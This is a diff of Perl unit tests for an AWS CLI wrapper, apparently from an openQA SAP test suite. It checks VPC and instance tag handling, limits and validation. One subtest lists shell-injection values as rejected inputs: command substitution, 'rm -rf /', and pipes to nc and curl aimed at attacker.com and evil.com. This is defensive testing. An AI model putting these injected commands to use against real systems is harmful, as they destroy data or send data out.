@@ -45,6 +45,134 @@ subtest '[aws_vpc_create] no tags' => sub {
     ok(($res eq 'Rocky'), "Result is '$res' expected to be 'Rocky'");
 };
 
+subtest '[aws_vpc_create] undef and empty tags' => sub {
+    my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
+    $awscli->redefine(record_info => sub { note(join(' ', 'RECORD_INFO -->', @_)); });
+    my @calls;
+    $awscli->redefine(script_output => sub { push @calls, $_[0]; return 'Rocky'; });
+
+    aws_vpc_create(region => 'GranMax', cidr => 'Sirion', tags => undef);
+    ok((none { /tag-specifications/ } @calls), 'No tag-specifications with undef tags');
+
+    @calls = ();
+    aws_vpc_create(region => 'GranMax', cidr => 'Sirion', tags => {});
+    ok((none { /tag-specifications/ } @calls), 'No tag-specifications with empty tags');
+};
+
+subtest '[aws_vpc_create] tags sorted' => sub {
+    my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
+    $awscli->redefine(record_info => sub { note(join(' ', 'RECORD_INFO -->', @_)); });
+    my @calls;
+    $awscli->redefine(script_output => sub { push @calls, $_[0]; return 'Rocky'; });
+
+    aws_vpc_create(region => 'GranMax', cidr => 'Sirion', tags => {zeta => 'z', alpha => 'a', mid => 'm'});
+
+    note("\n  -->  " . join("\n  -->  ", @calls));
+    ok((any { /"ResourceType=vpc,Tags=\[\{Key=alpha,Value=a\},\{Key=mid,Value=m\},\{Key=zeta,Value=z\}\]"/ } @calls), 'Tags sorted by key');
+};
+
+subtest '[aws_vpc_create] valid special characters in tags' => sub {
+    my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
+    $awscli->redefine(record_info => sub { note(join(' ', 'RECORD_INFO -->', @_)); });
+    my @calls;
+    $awscli->redefine(script_output => sub { push @calls, $_[0]; return 'Rocky'; });
+
+    aws_vpc_create(
+        region => 'GranMax',
+        cidr => 'Sirion',
+        tags => {
+            'key+-=._:/@' => 'val+-=._:/@',
+            openqa_created_date => '2026-01-01T00:00:00',
+            empty_value => '',
+            awslike => 'val',
+        });
+
+    note("\n  -->  " . join("\n  -->  ", @calls));
+    ok((any { /\{Key=key\+-=\._:\/\@,Value=val\+-=\._:\/\@\}/ } @calls), 'All safe characters in key and value');
+    ok((any { /\{Key=openqa_created_date,Value=2026-01-01T00:00:00\}/ } @calls), 'ISO timestamp with colons');
+    ok((any { /\{Key=empty_value,Value=\}/ } @calls), 'Empty value');
+    ok((any { /\{Key=awslike,Value=val\}/ } @calls), 'Key with aws but without aws: prefix');
+};
+
+subtest '[aws_vpc_create] tag limits' => sub {
+    my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
+    $awscli->redefine(record_info => sub { note(join(' ', 'RECORD_INFO -->', @_)); });
+    $awscli->redefine(script_output => sub { return 'Rocky'; });
+    my %args = (region => 'GranMax', cidr => 'Sirion');
+
+    lives_ok { aws_vpc_create(%args, tags => {'a' x 128 => 'ok'}) } '128-char key accepted';
+    throws_ok { aws_vpc_create(%args, tags => {'a' x 129 => 'ok'}) } qr/Tag key too long \(129/, '129-char key rejected';
+    lives_ok { aws_vpc_create(%args, tags => {key => 'b' x 256}) } '256-char value accepted';
+    throws_ok { aws_vpc_create(%args, tags => {key => 'b' x 257}) } qr/Tag value too long \(257/, '257-char value rejected';
+
+    my %tags_50 = map { ("key$_" => "val$_") } 1 .. 50;
+    lives_ok { aws_vpc_create(%args, tags => \%tags_50) } '50 tags accepted';
+    my %tags_51 = map { ("key$_" => "val$_") } 1 .. 51;
+    throws_ok { aws_vpc_create(%args, tags => \%tags_51) } qr/Too many tags: 51/, '51 tags rejected';
+};
+
+subtest '[aws_vpc_create] invalid tags' => sub {
+    my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
+    $awscli->redefine(record_info => sub { note(join(' ', 'RECORD_INFO -->', @_)); });
+    $awscli->redefine(script_output => sub { return 'Rocky'; });
+    my %args = (region => 'GranMax', cidr => 'Sirion');
+
+    throws_ok { aws_vpc_create(%args, tags => {'aws:reserved' => 'val'}) } qr/reserved aws: prefix/, 'aws: prefix in key rejected';
+    throws_ok { aws_vpc_create(%args, tags => {'key space' => 'val'}) } qr/Tag key contains invalid characters/, 'Space in key rejected';
+    throws_ok { aws_vpc_create(%args, tags => {'' => 'x'}) } qr/invalid characters/, 'Empty key rejected';
+    throws_ok { aws_vpc_create(%args, tags => {foo => undef}) } qr/undefined|uninitialized/, 'Undef tag value rejected';
+};
+
+subtest '[aws_vpc_create] empty tag key is rejected' => sub {
+    my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
+    $awscli->redefine(record_info => sub { note(join(' ', 'RECORD_INFO -->', @_)); });
+    my @calls;
+    $awscli->redefine(script_output => sub { push @calls, $_[0]; return 'Rocky'; });
+
+    # AWS tag keys must be 1 to 128 characters long
+    throws_ok { aws_vpc_create(region => 'GranMax', cidr => 'Sirion', tags => {'' => 'x'}) } qr/Tag key/, 'Empty key croaks';
+    note("\n  -->  " . join("\n  -->  ", @calls));
+    ok((none { /aws ec2 create-vpc/ } @calls), 'create-vpc not called');
+};
+
+subtest '[aws_vpc_create] undef tag value is rejected' => sub {
+    my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
+    $awscli->redefine(record_info => sub { note(join(' ', 'RECORD_INFO -->', @_)); });
+    my @calls;
+    $awscli->redefine(script_output => sub { push @calls, $_[0]; return 'Rocky'; });
+
+    throws_ok { aws_vpc_create(region => 'GranMax', cidr => 'Sirion', tags => {foo => undef}) } qr/Tag value undefined for key: foo/, 'Undef value croaks';
+    ok((none { /aws ec2 create-vpc/ } @calls), 'create-vpc not called');
+};
+
+subtest '[aws_vpc_create] shell injection attempts in tags' => sub {
+    my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
+    $awscli->redefine(record_info => sub { note(join(' ', 'RECORD_INFO -->', @_)); });
+    $awscli->redefine(script_output => sub { return 'Rocky'; });
+
+    my @injection_values = (
+        ['$(touch /tmp/pwned)', 'command substitution'],
+        ['`touch /tmp/pwned`', 'backtick substitution'],
+        ['; rm -rf /', 'semicolon injection'],
+        ['| nc attacker.com 4444', 'pipe injection'],
+        ['&& curl evil.com', 'AND injection'],
+        ['|| curl evil.com', 'OR injection'],
+        ['* glob', 'glob'],
+        ['! history', 'history expansion'],
+        ['> redirect', 'redirect'],
+        ['< redirect', 'redirect'],
+        ['\ backslash', 'backslash'],
+        ["' single quote", 'single quote'],
+        ['" double quote', 'double quote'],
+        ['space in value', 'space'],
+        ['comma,value', 'comma'],
+        ['{brace}', 'curly brace'],
+    );
+    foreach my $t (@injection_values) {
+        my ($val, $desc) = @$t;
+        throws_ok { aws_vpc_create(region => 'GranMax', cidr => 'Sirion', tags => {key => $val}) } qr/Tag value contains invalid characters/, "Value with $desc rejected";
+    }
+};
 
 subtest '[aws_vpc_get_id]' => sub {
     my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
@@ -400,6 +528,31 @@ subtest '[aws_vm_create]' => sub {
     ok((any { /aws ec2 run-instances/ } @calls), 'Command run-instances');
     ok((any { /tag-specifications/ } @calls), 'Tag specifications present');
     ok((any { /\{Key=openqa_var_job_id,Value=Sylphy\}/ } @calls), 'Tag passed to tag-specifications');
+    ok((any { /ResourceType=instance/ } @calls), 'ResourceType is instance');
+    ok(($res eq 'i-123'), "Result is '$res' expected to be 'i-123'");
+};
+
+subtest '[aws_vm_create] no tags' => sub {
+    my $awscli = Test::MockModule->new('sles4sap::aws_cli', no_auto => 1);
+    $awscli->redefine(record_info => sub { note(join(' ', 'RECORD_INFO -->', @_)); });
+    my @calls;
+    $awscli->redefine(script_output => sub {
+            push @calls, $_[0];
+            return @calls == 1 ? 'ami-123' : 'i-123';
+    });
+
+    my $res = aws_vm_create(
+        instance_type => 'Micra',
+        image_name => 'Sentra',
+        owner => 'Elgrand',
+        subnet_id => 'Pathfinder',
+        sg_id => 'Serena',
+        ssh_key => 'Altima',
+        region => 'Almera');
+
+    note("\n  -->  " . join("\n  -->  ", @calls));
+    ok((any { /aws ec2 run-instances/ } @calls), 'Command run-instances');
+    ok((none { /tag-specifications/ } @calls), 'No tag-specifications without tags');
     ok(($res eq 'i-123'), "Result is '$res' expected to be 'i-123'");
 };
 
